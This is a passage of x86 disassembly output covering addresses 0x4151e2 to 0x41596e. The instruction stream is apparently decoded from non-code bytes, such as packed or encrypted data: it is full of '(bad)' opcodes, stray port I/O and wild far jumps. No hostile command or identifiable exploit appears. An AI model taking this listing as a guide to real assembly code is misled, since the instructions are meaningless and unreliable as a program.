  4151e2:	jnp    0x41518d
  4151e4:	pop    ss
  4151e5:	adc    DWORD PTR fs:[eax+esi*2-0x4f],ecx
  4151ea:	push   esp
  4151eb:	pop    ebx
  4151ec:	sub    DWORD PTR [esp+ebp*1-0x23],ebp
  4151f0:	cmc    
  4151f1:	iret   
  4151f2:	loop   0x4151cc
  4151f4:	fidivr DWORD PTR [ebx-0x49]
  4151f7:	dec    edi
  4151f8:	in     al,dx
  4151f9:	sbb    eax,0x4f41283f
  4151fe:	lds    ebp,FWORD PTR [ebx+0x6d16f477]
  415204:	xor    DWORD PTR [edi+0x64],0x97d9b249
  41520b:	mov    ss,WORD PTR [edx-0x29]
  41520e:	(bad)
  415212:	and    bl,dl
  415214:	adc    eax,0xd2fa344e
  415219:	aad    0x5f
  41521b:	lea    ecx,[edi+ebp*4+0x47454ca4]
  415222:	cmp    al,0xc6
  415224:	test   al,0x56
  415226:	pop    edx
  415227:	shl    DWORD PTR [ebx],0x25
  41522a:	stc    
  41522b:	cmp    eax,DWORD PTR [ebx-0xd]
  41522e:	push   ss
  41522f:	and    DWORD PTR [ebx],eax
  415231:	ss ret 0x7fa
  415235:	or     DWORD PTR [eax],ebx
  415237:	jle    0x415230
  415239:	lods   eax,DWORD PTR ds:[esi]
  41523a:	xchg   ebp,eax
  41523b:	stc    
  41523c:	out    0xb6,al
  41523e:	add    DWORD PTR [edi],ebx
  415240:	ins    BYTE PTR es:[edi],dx
  415241:	sbb    bl,bh
  415243:	mov    bl,0x9b
  415245:	outs   dx,BYTE PTR ds:[esi]
  415246:	add    edx,edx
  415248:	mov    ah,0x96
  41524a:	popa   
  41524b:	clc    
  41524c:	jg     0x41520e
  41524e:	fs jns 0x41521f
  415251:	or     al,ch
  415253:	adc    bh,cl
  415255:	ret    
  415256:	push   edi
  415257:	or     edx,DWORD PTR [edi-0x2dc54403]
  41525d:	inc    eax
  41525e:	fisub  WORD PTR [esi-0x142e453b]
  415264:	adc    ebx,DWORD PTR [edx+eiz*2+0x16]
  415268:	aas    
  415269:	mov    bl,0x36
  41526b:	stos   DWORD PTR es:[edi],eax
  41526c:	cs pop ds
  41526e:	jae    0x415260
  415270:	jbe    0x4152da
  415272:	cdq    
  415273:	sahf   
  415274:	cmp    DWORD PTR [ecx+ebp*4],edx
  415277:	fiadd  DWORD PTR [esi+0x2cb54a88]
  41527d:	mov    es,esi
  41527f:	pop    esi
  415280:	aas    
  415281:	jns    0x415294
  415283:	mov    fs,WORD PTR [edx]
  415285:	mov    esi,0xf6c424de
  41528a:	and    DWORD PTR [ebx+0x711099f0],0x45a7b016
  415294:	adc    BYTE PTR [ecx+0x7763ab13],0xaf
  41529b:	cmp    DWORD PTR [edx-0x16],eax
  41529e:	in     al,dx
  41529f:	lods   al,BYTE PTR ds:[esi]
  4152a0:	dec    edi
  4152a1:	pop    esi
  4152a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152a3:	mov    bl,0x66
  4152a5:	or     DWORD PTR [esi+eax*1],ebp
  4152a8:	add    BYTE PTR [edx+0x28f6f824],dh
  4152ae:	mov    cl,0xdb
  4152b0:	jl     0x415330
  4152b2:	stos   DWORD PTR es:[edi],eax
  4152b3:	lea    ebp,[ebx]
  4152b5:	mov    edi,0xe8aa182c
  4152ba:	rcr    ebx,cl
  4152bc:	pop    ds
  4152bd:	fnsave [ecx+0x1fc7acba]
  4152c3:	or     DWORD PTR [esp+ecx*1-0x638aacc5],edi
  4152ca:	or     eax,ebx
  4152cc:	ret    
  4152cd:	les    ebp,FWORD PTR [edi+ebp*1]
  4152d0:	xchg   esi,eax
  4152d1:	scas   eax,DWORD PTR es:[edi]
  4152d2:	push   ebx
  4152d3:	bound  ebp,QWORD PTR [ebp+eiz*4+0x27a77f30]
  4152da:	jmp    0x6724:0xce6e26
  4152e1:	xor    eax,0xcf7ae6f2
  4152e6:	mov    ecx,0x4b4df14a
  4152eb:	cmp    eax,0x66124c9f
  4152f0:	adc    dl,BYTE PTR ds:0x41d3604f
  4152f6:	iret   
  4152f7:	sub    al,0xbd
  4152f9:	in     eax,dx
  4152fa:	sbb    al,bl
  4152fc:	push   ds
  4152fd:	fsub   QWORD PTR [edx-0x77]
  415300:	cmp    ebp,DWORD PTR [eax+0x2f]
  415303:	mov    bh,0xb1
  415305:	xchg   esi,eax
  415306:	xchg   ebx,eax
  415307:	mov    ds:0xdac89e3c,al
  41530c:	and    BYTE PTR [ebp+0x6019a8fe],al
  415312:	fbstp  TBYTE PTR [ebx]
  415314:	fst    DWORD PTR [edi+0x7b]
  415317:	xchg   esp,eax
  415318:	and    esi,edx
  41531a:	xchg   BYTE PTR [edx+0x73],bh
  41531d:	push   cs
  41531e:	pop    esp
  41531f:	mov    cl,0x51
  415321:	cwde   
  415322:	mov    DWORD PTR [eax+edx*2],edx
  415325:	arpl   ax,bp
  415327:	fs pop edi
  415329:	add    DWORD PTR [esi],ecx
  41532b:	dec    edx
  41532c:	jle    0x4153ad
  41532e:	inc    esi
  41532f:	mov    edi,esi
  415331:	pop    ebx
  415332:	cmp    ax,0x6c78
  415336:	dec    esp
  415337:	sti    
  415338:	das    
  415339:	out    0xc3,al
  41533b:	lods   eax,DWORD PTR ds:[esi]
  41533c:	sub    ch,BYTE PTR [eax]
  41533e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41533f:	in     eax,dx
  415340:	and    eax,esi
  415342:	xchg   DWORD PTR [edx],esi
  415344:	fidivr DWORD PTR [ebp-0x76861020]
  41534a:	retf   
  41534b:	inc    ecx
  41534c:	sbb    al,0xd
  41534e:	aad    0xca
  415350:	not    DWORD PTR [ebx-0x61]
  415353:	arpl   WORD PTR [edi+eax*8-0x7cce7748],bp
  41535a:	pop    edx
  41535b:	mov    cl,0x1a
  41535d:	mov    edx,0x40541933
  415362:	in     eax,dx
  415363:	inc    eax
  415364:	sbb    BYTE PTR [esi],bh
  415366:	es test eax,0xf326aa66
  41536c:	inc    ecx
  41536d:	pop    esi
  41536e:	add    BYTE PTR [edx+0x60],0xf8
  415372:	sub    eax,edi
  415374:	mov    dh,0xdd
  415376:	inc    esp
  415377:	dec    ebp
  415378:	cmp    BYTE PTR [esi+0x5ffcc0e],bl
  41537e:	sub    eax,0xc5464aa5
  415383:	dec    esp
  415384:	xchg   DWORD PTR [ecx+esi*2-0xdd92948],ebp
  41538b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41538c:	xchg   edx,eax
  41538d:	retf   
  41538e:	mov    cl,0x31
  415390:	jmp    0x9977f640
  415395:	pop    ss
  415396:	xor    dh,ch
  415398:	aam    0xe6
  41539a:	fidiv  DWORD PTR [edx]
  41539c:	call   0xa15c4725
  4153a1:	sub    cl,bl
  4153a3:	push   edi
  4153a4:	pop    eax
  4153a5:	or     eax,0x4b3d747
  4153aa:	and    eax,0x21bf8f01
  4153af:	xchg   ebp,eax
  4153b0:	scas   al,BYTE PTR es:[edi]
  4153b1:	out    dx,eax
  4153b2:	mov    ecx,0x6d7ccb86
  4153b7:	hlt    
  4153b8:	test   BYTE PTR [ecx],dl
  4153ba:	icebp  
  4153bb:	bound  esi,QWORD PTR [eax]
  4153bd:	push   es
  4153be:	adc    eax,DWORD PTR [eax-0x67]
  4153c1:	xor    eax,0x81d9520a
  4153c6:	addr16 psubusb mm1,mm5
  4153ca:	loope  0x415435
  4153cc:	add    bl,ch
  4153ce:	jp     0x415365
  4153d0:	xor    eax,0x3b34299a
  4153d5:	xchg   esp,eax
  4153d6:	jg     0x4153f3
  4153d8:	mov    ds:0x939788b7,al
  4153dd:	sbb    BYTE PTR [ebx-0x2b0518ed],bl
  4153e3:	mov    ah,0x43
  4153e5:	xor    DWORD PTR [eax-0x3],eax
  4153e8:	(bad)  
  4153ea:	jecxz  0x4153b1
  4153ec:	jbe    0x4153cc
  4153ee:	enter  0x151,0x92
  4153f2:	adc    esi,DWORD PTR [ebp+0x329b34d2]
  4153f8:	test   DWORD PTR [esi],edi
  4153fa:	dec    edx
  4153fb:	inc    edx
  4153fc:	fisttp DWORD PTR [eax-0x11d24c66]
  415402:	or     al,0x1b
  415404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415405:	lock (bad) 
  415407:	cld    
  415408:	or     bl,BYTE PTR ds:0xb317ca02
  41540e:	mov    ecx,0x56f22ed5
  415413:	dec    esp
  415414:	and    al,BYTE PTR [esp+ecx*1+0xe]
  415418:	loope  0x415450
  41541a:	loope  0x4153ae
  41541c:	cld    
  41541d:	(bad)  
  41541e:	push   edi
  41541f:	dec    esp
  415420:	out    0xc2,al
  415422:	(bad)  
  415423:	loopne 0x415425
  415425:	mov    cs,ecx
  415427:	jno    0x41540d
  415429:	outs   dx,DWORD PTR ds:[esi]
  41542a:	mov    WORD PTR [esi+0x71ae5424],ds
  415430:	cmp    edx,DWORD PTR [edi-0x5]
  415433:	mov    al,0x7
  415435:	nop
  415436:	test   BYTE PTR [eax],dh
  415438:	push   0x40
  41543a:	inc    edi
  41543b:	or     al,0xc4
  41543d:	sti    
  41543e:	inc    esp
  41543f:	and    ah,BYTE PTR [ecx]
  415441:	inc    eax
  415442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415443:	inc    ebp
  415444:	add    DWORD PTR [edx+0x62e6bc24],eax
  41544a:	int3   
  41544b:	push   0xe8a0de9e
  415450:	sbb    edi,ebx
  415452:	mov    ebp,ebp
  415454:	or     edi,DWORD PTR [eax+0x7a]
  415457:	shl    BYTE PTR [ebp+0xf],1
  41545a:	fs pop es
  41545c:	mov    esi,DWORD PTR [esi]
  41545e:	jbe    0x4154a6
  415460:	mov    edi,DWORD PTR [edi+eax*1-0x1]
  415464:	jge    0x41542e
  415466:	ret    0x800
  415469:	push   edi
  41546a:	pop    ebp
  41546b:	in     eax,dx
  41546c:	mov    al,0xc7
  41546e:	pop    ds
  41546f:	xor    bh,BYTE PTR [ecx-0x16]
  415472:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415473:	xchg   ecx,eax
  415474:	push   esp
  415475:	xchg   ebx,eax
  415476:	cmc    
  415477:	mov    cl,0x8c
  415479:	mov    edi,0x860461a
  41547e:	mov    ebx,0x17aef009
  415483:	scas   al,BYTE PTR es:[edi]
  415484:	cmp    ah,BYTE PTR [ebp+0x5a]
  415487:	xlat   BYTE PTR ds:[ebx]
  415488:	and    bh,BYTE PTR [ebx+0x2b066453]
  41548e:	mov    edi,eax
  415490:	lods   al,BYTE PTR ds:[esi]
  415491:	imul   edi,DWORD PTR [ebp+0x60708c5b],0x26
  415498:	and    ebx,DWORD PTR [eax-0x6e]
  41549b:	cmp    BYTE PTR [esi],0xca
  41549e:	loope  0x415470
  4154a0:	popf   
  4154a1:	lahf   
  4154a2:	xor    BYTE PTR [edi+0x5c],bl
  4154a5:	push   esi
  4154a6:	cmp    DWORD PTR [si-0x339],esp
  4154ab:	jno    0x415479
  4154ad:	xchg   edx,eax
  4154ae:	add    edi,DWORD PTR [esi+0x6b47a224]
  4154b4:	sbb    ch,BYTE PTR [ecx+0x28]
  4154b7:	adc    eax,0xff5c583
  4154bc:	rcl    BYTE PTR [edi],1
  4154be:	mov    al,ds:0x267f6ac8
  4154c3:	xchg   edi,eax
  4154c4:	test   eax,0x7212a673
  4154c9:	in     eax,dx
  4154ca:	loopne 0x41544c
  4154cc:	bound  esp,QWORD PTR [esi+0x76f80cca]
  4154d2:	out    0xb6,al
  4154d4:	mov    dh,BYTE PTR [eax+0x43ac04fc]
  4154da:	pop    esp
  4154db:	into   
  4154dc:	adc    eax,0xf18650c
  4154e1:	push   ebp
  4154e2:	xor    dh,BYTE PTR [ebp+0x19]
  4154e5:	ja     0x415507
  4154e7:	mov    ah,0xeb
  4154e9:	jle    0x41548b
  4154eb:	add    edx,DWORD PTR [ebx-0x12]
  4154ee:	jbe    0x4154c9
  4154f0:	pushf  
  4154f1:	push   ebx
  4154f2:	fwait
  4154f3:	mov    bl,0x9b
  4154f5:	outs   dx,DWORD PTR ds:[esi]
  4154f6:	jo     0x4154c8
  4154f8:	push   cs
  4154f9:	push   es
  4154fa:	mov    edx,0x7fda1416
  4154ff:	pop    eax
  415500:	outs   dx,BYTE PTR ds:[esi]
  415501:	inc    edx
  415502:	sub    eax,0x9a657143
  415507:	dec    esp
  415508:	loope  0x415576
  41550a:	scas   al,BYTE PTR es:[edi]
  41550b:	push   ds
  41550c:	jle    0x4154e8
  41550e:	test   al,0x35
  415510:	ins    DWORD PTR es:[edi],dx
  415511:	(bad)  
  415512:	aad    0xba
  415514:	in     eax,0x91
  415516:	push   0xb8fe03ea
  41551b:	fstp   TBYTE PTR es:[ecx]
  41551e:	jp     0x415510
  415520:	ja     0x415527
  415522:	dec    edx
  415523:	pushf  
  415524:	sbb    BYTE PTR [ebx-0x5d3e8dd5],bh
  41552a:	xor    eax,0x80747392
  41552f:	nop
  415530:	push   es
  415531:	loopne 0x4154d1
  415533:	push   edx
  415534:	sbb    al,0xc7
  415536:	movlps QWORD PTR ds:0x390a6d8a,xmm0
  41553d:	or     dh,BYTE PTR [ebx+eax*4+0x2e]
  415541:	pop    eax
  415542:	fild   WORD PTR [esi-0x19]
  415545:	loop   0x415529
  415547:	dec    edx
  415548:	push   edi
  415549:	or     ch,dh
  41554b:	(bad)  
  41554c:	out    0xfe,eax
  41554e:	push   ds
  41554f:	dec    eax
  415550:	mov    edi,0x81a6e2d1
  415555:	dec    ecx
  415556:	out    dx,al
  415557:	das    
  415558:	(bad)  ds:0x744ec696
  41555e:	fidivr DWORD PTR [ecx+0x2d212441]
  415564:	xchg   esp,eax
  415565:	add    BYTE PTR [ecx],al
  415567:	or     al,0x4f
  415569:	sub    ebp,ebp
  41556b:	cmp    BYTE PTR [edx],bl
  41556d:	cmp    eax,0x5c49b6bc
  415572:	cs ss mov cl,0xa6
  415576:	fldenv [eax+0x6b]
  415579:	repnz arpl WORD PTR [eax+edi*1+0x5d],bx
  41557e:	(bad)  
  41557f:	xchg   edx,eax
  415580:	xchg   ebp,eax
  415581:	sti    
  415582:	cmp    BYTE PTR [ecx],ah
  415584:	inc    edi
  415585:	sar    eax,1
  415587:	imul   esp,DWORD PTR [edx-0x11ae058f],0x77
  41558e:	in     eax,dx
  41558f:	iret   
  415590:	dec    ecx
  415591:	cli    
  415592:	scas   al,BYTE PTR es:[edi]
  415593:	dec    ebx
  415594:	cmp    dl,cl
  415596:	(bad)  
  415598:	enter  0xeed4,0xc0
  41559c:	fwait
  41559d:	test   al,0x3a
  41559f:	add    al,ch
  4155a1:	xchg   esp,eax
  4155a2:	lods   eax,DWORD PTR ds:[esi]
  4155a3:	jle    0x4155e8
  4155a5:	mov    ?,WORD PTR [ecx]
  4155a7:	mov    ds:0xe4c1d516,eax
  4155ac:	pushf  
  4155ad:	inc    ebp
  4155ae:	pop    esi
  4155af:	add    esp,ebp
  4155b1:	sub    eax,0xa92fe7d8
  4155b6:	fld    QWORD PTR [ecx-0x6c]
  4155b9:	or     DWORD PTR fs:[ecx+0x54fdd7f3],esi
  4155c0:	ret    0xad82
  4155c3:	jae    0x415634
  4155c5:	hlt    
  4155c6:	leave  
  4155c7:	add    BYTE PTR [edi],cl
  4155c9:	sub    eax,0x7fc08bef
  4155ce:	push   esi
  4155cf:	les    eax,FWORD PTR [ebx-0x72]
  4155d2:	cmc    
  4155d3:	js     0x4155fb
  4155d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155d6:	xlat   BYTE PTR ds:[ebx]
  4155d7:	js     0x415593
  4155d9:	jnp    0x4155a8
  4155db:	lods   al,BYTE PTR ds:[esi]
  4155dc:	push   ss
  4155dd:	xchg   ecx,eax
  4155de:	mov    ah,0xbb
  4155e0:	xor    ecx,DWORD PTR ds:0xd2bd33b5
  4155e6:	ja     0x41561d
  4155e8:	sub    ah,al
  4155ea:	mov    edi,0xc07a7f17
  4155ef:	nop
  4155f0:	xchg   edx,eax
  4155f1:	pop    eax
  4155f2:	retf   0x5dc2
  4155f5:	test   al,0xed
  4155f7:	pop    edi
  4155f8:	or     ecx,ecx
  4155fa:	test   BYTE PTR [esp+esi*2],bh
  4155fd:	jae    0x41558b
  4155ff:	mov    cl,0xe9
  415601:	fwait
  415602:	mov    al,BYTE PTR [edx-0x5c271c4d]
  415608:	mov    WORD PTR [ebx-0x5ded813e],cs
  41560e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41560f:	outs   dx,BYTE PTR ds:[esi]
  415610:	into   
  415611:	mov    al,0x72
  415613:	add    BYTE PTR [eax],bl
  415615:	inc    eax
  415616:	inc    eax
  415617:	(bad)  
  415618:	push   ebp
  415619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41561a:	stos   DWORD PTR es:[edi],eax
  41561b:	xchg   edi,eax
  41561c:	rol    bl,cl
  41561e:	pop    eax
  41561f:	(bad)  
  415621:	jbe    0x4155c7
  415623:	pop    ebp
  415624:	mov    eax,ds:0x471def30
  415629:	pop    es
  41562a:	mov    dl,0x59
  41562c:	es cmp eax,0x93ccc52f
  415632:	lock data16 adc BYTE PTR [esi-0x1b358a99],dh
  41563a:	jne    0x415691
  41563c:	aam    0x9b
  41563e:	mov    esi,DWORD PTR [eax+0x73]
  415641:	xlat   BYTE PTR ds:[ebx]
  415642:	ja     0x415676
  415644:	push   edx
  415645:	cmp    esp,DWORD PTR [ebx]
  415647:	ficom  WORD PTR [esp+ecx*2+0x31]
  41564b:	inc    esp
  41564c:	dec    ebp
  41564d:	test   BYTE PTR [edx-0x2a],dh
  415650:	push   esi
  415651:	fwait
  415652:	ss pusha 
  415654:	jnp    0x4156bd
  415656:	pusha  
  415657:	(bad)  
  415658:	push   edx
  415659:	inc    ebx
  41565a:	lods   eax,DWORD PTR ds:[esi]
  41565b:	xchg   ebp,eax
  41565c:	jg     0x4156aa
  41565e:	push   ebp
  41565f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415660:	pushf  
  415661:	mov    al,ds:0x7a7b0d84
  415666:	sbb    dh,dl
  415668:	(bad)  
  415669:	jb     0x415666
  41566b:	call   0x5855adc0
  415670:	jne    0x4156ad
  415672:	in     eax,dx
  415673:	cli    
  415674:	dec    esp
  415675:	ja     0x4156de
  415677:	cli    
  415678:	(bad)  
  415679:	sbb    DWORD PTR [edx+edi*2-0xc96e932],ebx
  415680:	xchg   esi,eax
  415681:	pop    ds
  415682:	mov    cl,0xbe
  415684:	or     eax,0x36c81dbf
  415689:	push   ecx
  41568a:	ficom  WORD PTR [esi]
  41568c:	mov    al,0xc2
  41568e:	xchg   DWORD PTR [ebp+eiz*1-0x2da83bc1],ecx
  415695:	cmp    BYTE PTR [esi-0x610f83fd],bh
  41569b:	add    cl,BYTE PTR [edi-0x78996a57]
  4156a1:	sub    al,BYTE PTR [ecx+ecx*1]
  4156a4:	push   0x60
  4156a6:	dec    esi
  4156a7:	mov    esi,DWORD PTR [ebx-0x4485983f]
  4156ad:	dec    ecx
  4156ae:	popf   
  4156af:	or     eax,0xb281515c
  4156b4:	mov    eax,0x307ed9fe
  4156b9:	mov    dh,0xd3
  4156bb:	mov    esi,0x464ed964
  4156c0:	inc    ecx
  4156c1:	std    
  4156c2:	mov    dl,0xbf
  4156c4:	mul    ecx
  4156c6:	sbb    DWORD PTR [ecx-0xd],ebx
  4156c9:	cmp    esi,DWORD PTR [esp+ebp*4-0x14ea7ddb]
  4156d0:	shl    DWORD PTR [edi+eax*4-0x6acc464b],0xd9
  4156d8:	cmp    DWORD PTR [eax],esi
  4156da:	hlt    
  4156db:	and    eax,edi
  4156dd:	cs loop 0x4156c1
  4156e0:	push   ebx
  4156e1:	ja     0x41572f
  4156e3:	jb     0x415704
  4156e5:	jg     0x41575f
  4156e7:	sbb    esp,DWORD PTR ds:0x6c804da4
  4156ed:	mov    dl,0x21
  4156ef:	adc    eax,0xe9dd7431
  4156f4:	ins    BYTE PTR es:[edi],dx
  4156f5:	dec    edi
  4156f6:	je     0x415745
  4156f8:	mov    ecx,0x48323227
  4156fd:	push   ecx
  4156fe:	sahf   
  4156ff:	icebp  
  415700:	fsub   DWORD PTR [eax-0x52]
  415703:	repnz cmp al,0x8b
  415706:	dec    ecx
  415707:	pusha  
  415708:	sub    ecx,esi
  41570a:	aas    
  41570b:	cmp    eax,0x3f94ddfb
  415710:	sbb    esp,DWORD PTR [edx+0x2e]
  415713:	mov    dh,0xb7
  415715:	(bad)  
  415716:	jmp    0x2e632007
  41571b:	mov    WORD PTR [edx-0x28],?
  41571e:	leave  
  41571f:	ins    DWORD PTR es:[edi],dx
  415720:	ins    BYTE PTR es:[edi],dx
  415721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415722:	div    al
  415724:	enter  0xde96,0x14
  415728:	jmp    0x415701
  41572a:	cmp    DWORD PTR [ecx-0x27786e1],edx
  415730:	mov    al,BYTE PTR [edi-0x5256c0b8]
  415736:	mov    edi,0x6087427e
  41573b:	mov    eax,0x4e0508fa
  415740:	xor    ch,al
  415742:	jmp    0x41579d
  415744:	pop    es
  415745:	xlat   BYTE PTR ds:[ebx]
  415746:	dec    edi
  415747:	sbb    eax,0x75b15853
  41574c:	pop    edx
  41574d:	sub    dh,BYTE PTR [eax]
  41574f:	popf   
  415750:	test   BYTE PTR [esi],al
  415752:	fimul  DWORD PTR [edi+eiz*2]
  415755:	cmp    DWORD PTR [edx-0x5c],0x78
  415759:	push   ecx
  41575a:	xor    dh,BYTE PTR [eax+0x51d3d413]
  415760:	add    al,0x84
  415762:	shr    BYTE PTR [esi],1
  415764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415765:	jno    0x41574e
  415767:	xchg   ebp,eax
  415768:	sbb    BYTE PTR [ebx],ch
  41576a:	fidivr DWORD PTR [ecx+esi*8]
  41576d:	leave  
  41576e:	xchg   esi,eax
  41576f:	sahf   
  415770:	(bad)  
  415772:	shr    cl,0x11
  415775:	test   BYTE PTR gs:[edx],0x49
  415779:	mov    BYTE PTR [esi+0x1a849a8a],cl
  41577f:	dec    esp
  415780:	test   BYTE PTR [ebp+0x55],cl
  415783:	and    BYTE PTR [ebx],ch
  415785:	cmc    
  415786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415787:	or     ecx,DWORD PTR [eax]
  415789:	push   eax
  41578a:	xor    ebp,DWORD PTR [esi]
  41578c:	aad    0x1e
  41578e:	dec    edx
  41578f:	out    dx,eax
  415790:	inc    ecx
  415791:	or     esp,DWORD PTR [eax+0xd]
  415794:	out    0x70,eax
  415796:	aaa    
  415797:	(bad)  
  415798:	mov    DWORD PTR [esi+edi*8+0x456177cd],eax
  41579f:	mov    dh,BYTE PTR [ebp-0x64]
  4157a2:	es cmp eax,0x34a8a2a7
  4157a8:	shr    esi,0x39
  4157ab:	jnp    0x415787
  4157ad:	and    ebp,esp
  4157af:	shl    BYTE PTR [ebx+0x2],0x8
  4157b3:	dec    edx
  4157b4:	test   al,0x93
  4157b6:	add    BYTE PTR [ecx+0x3b],cl
  4157b9:	fisub  WORD PTR [ebx+0x6fcf8809]
  4157bf:	fs aam 0x6b
  4157c2:	mov    ds:0x201caa1e,eax
  4157c7:	mov    al,ds:0xcbf4b833
  4157cc:	loop   0x415751
  4157ce:	out    dx,al
  4157cf:	leave  
  4157d0:	xchg   ebx,eax
  4157d1:	jge    0x415823
  4157d3:	popf   
  4157d4:	lea    edi,[eax]
  4157d6:	and    bl,ah
  4157d8:	je     0x4157d1
  4157da:	push   ss
  4157db:	call   0xd05f:0x272c0b5b
  4157e2:	aas    
  4157e3:	lock mov ah,0xc8
  4157e6:	ret    
  4157e7:	lds    edx,FWORD PTR [eax+0xc332890]
  4157ed:	xchg   edi,eax
  4157ee:	in     al,0x46
  4157f0:	xchg   ebp,eax
  4157f1:	xor    ecx,DWORD PTR [ecx+0x21881779]
  4157f7:	test   DWORD PTR [edx+0x13],esp
  4157fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157fb:	push   0x143ccee2
  415800:	or     bh,bh
  415802:	fld    TBYTE PTR [eax+0x43]
  415805:	mov    ch,0x2f
  415807:	dec    DWORD PTR [edx]
  415809:	and    edi,DWORD PTR [esi]
  41580b:	in     al,dx
  41580c:	push   esi
  41580d:	jne    0x41584b
  41580f:	into   
  415810:	(bad)  
  415811:	jp     0x41588d
  415813:	cmc    
  415814:	test   al,0x1
  415816:	and    DWORD PTR [edi-0x4687f6f5],ebx
  41581c:	dec    esp
  41581d:	gs xchg esi,eax
  41581f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415820:	test   al,0x87
  415822:	inc    edi
  415823:	dec    eax
  415824:	jne    0x41580c
  415826:	push   ss
  415827:	xchg   edx,eax
  415828:	mov    al,ds:0x60027468
  41582d:	aas    
  41582e:	sbb    DWORD PTR [ebp-0x63b55b09],eax
  415834:	retf   
  415835:	fisub  WORD PTR [edx+0x2e09d9cb]
  41583b:	(bad)  
  41583c:	loopne 0x41586f
  41583e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41583f:	jne    0x4158bd
  415841:	fiadd  DWORD PTR [ebp-0x56]
  415844:	lock jmp 0x6989:0x96908f1e
  41584c:	repnz mov edi,0x22447a52
  415852:	push   ebp
  415853:	out    0x3d,al
  415855:	(bad)  
  415856:	lods   eax,DWORD PTR ds:[esi]
  415857:	in     eax,0x90
  415859:	adc    al,0x51
  41585b:	mov    edi,0x8b9c987b
  415860:	inc    ecx
  415861:	adc    edx,DWORD PTR [edx-0x31]
  415864:	test   BYTE PTR [ebp-0x654e3987],cl
  41586a:	or     al,0xcd
  41586c:	lahf   
  41586d:	ret    
  41586e:	mov    ah,BYTE PTR [ebx-0xf]
  415871:	mov    bl,BYTE PTR [ebp+ebx*1+0x5fc8e1e8]
  415878:	cdq    
  415879:	aaa    
  41587a:	es ins DWORD PTR es:[edi],dx
  41587c:	add    al,0x2
  41587e:	inc    eax
  41587f:	test   al,0xd1
  415881:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415882:	inc    esi
  415883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415884:	faddp  st(1),st
  415886:	push   eax
  415887:	call   FWORD PTR [esp+ebx*8]
  41588a:	push   0xb341d6b5
  41588f:	mov    esp,0x7db70944
  415894:	xor    al,0x59
  415896:	sbb    al,BYTE PTR [edi-0x9e0ef7]
  41589c:	jno    0x415838
  41589e:	ja     0x415845
  4158a0:	mov    dl,0x85
  4158a2:	mov    bl,0xef
  4158a4:	aas    
  4158a5:	jbe    0x415870
  4158a7:	or     bh,dl
  4158a9:	outs   dx,DWORD PTR ds:[esi]
  4158aa:	jbe    0x415846
  4158ac:	push   ebx
  4158ad:	jbe    0x4158cd
  4158af:	mov    esi,0xec881a7d
  4158b4:	jp     0x41585d
  4158b6:	fistp  DWORD PTR [ebx]
  4158b8:	mov    ds:0x287e0c2f,eax
  4158bd:	and    al,0x48
  4158bf:	ja     0x415900
  4158c1:	push   ss
  4158c2:	mov    eax,ds:0x1b76416c
  4158c7:	es jp  0x41588f
  4158ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158cb:	cdq    
  4158cc:	out    dx,eax
  4158cd:	test   DWORD PTR [ecx-0x75715118],0xce4b4d5
  4158d7:	shl    ebx,cl
  4158d9:	popa   
  4158da:	les    esi,FWORD PTR [esp+eax*1-0x78fc8489]
  4158e1:	mov    esi,0x5bd06c75
  4158e6:	stc    
  4158e7:	mov    ah,0xc3
  4158e9:	xlat   BYTE PTR ds:[ebx]
  4158ea:	in     eax,dx
  4158eb:	int    0x50
  4158ed:	adc    cl,BYTE PTR [edx-0x23]
  4158f0:	and    al,0x28
  4158f2:	adc    al,0xa0
  4158f4:	test   ebp,ebp
  4158f6:	scas   eax,DWORD PTR es:[edi]
  4158f7:	retf   
  4158f8:	mov    ebp,0x2d5af95f
  4158fd:	xchg   edx,eax
  4158fe:	push   ss
  4158ff:	pop    esi
  415900:	(bad)  
  415901:	cmp    BYTE PTR [edi-0x6e171e96],ch
  415907:	int3   
  415908:	xchg   ebx,eax
  415909:	lods   al,BYTE PTR ds:[esi]
  41590a:	mov    al,0xe0
  41590c:	xor    ebx,DWORD PTR [edi+0x66094273]
  415912:	je     0x41596d
  415914:	jno    0x4158f7
  415916:	dec    ebp
  415917:	pop    es
  415918:	fadd   QWORD PTR [eax-0x7]
  41591b:	ds icebp 
  41591d:	stc    
  41591e:	sub    BYTE PTR [esp+ebx*8],ah
  415921:	mov    edx,0xb1585ded
  415926:	bound  ebp,QWORD PTR [ebx-0x3f]
  415929:	dec    esi
  41592a:	mov    ebx,0x9f958718
  41592f:	mov    edi,0xcb4b6fff
  415934:	jb     0x4159b5
  415936:	imul   esi,edi,0x6c
  415939:	ja     0x415990
  41593b:	inc    eax
  41593c:	push   ds
  41593d:	ret    
  41593e:	and    eax,0x6da5a764
  415943:	or     dl,al
  415945:	call   0x1781:0xa6293470
  41594c:	mov    bh,0x9e
  41594e:	test   DWORD PTR [ecx],ebx
  415950:	cmp    edx,DWORD PTR [esi]
  415952:	stos   BYTE PTR es:[edi],al
  415953:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415954:	test   BYTE PTR [esi+0x5406c590],dl
  41595a:	pop    ebx
  41595b:	into   
  41595c:	ror    BYTE PTR [ebp+0x6d],0x10
  415960:	std    
  415961:	cmp    edi,DWORD PTR [ebx]
  415963:	add    al,0xdc
  415965:	push   eax
  415966:	pop    eax
  415967:	out    0x3c,al
  415969:	mov    bl,0xb1
  41596b:	bound  esp,QWORD PTR [eax+0x9]
  41596e:	fld    QWORD PTR [edx-0x59a5d774]
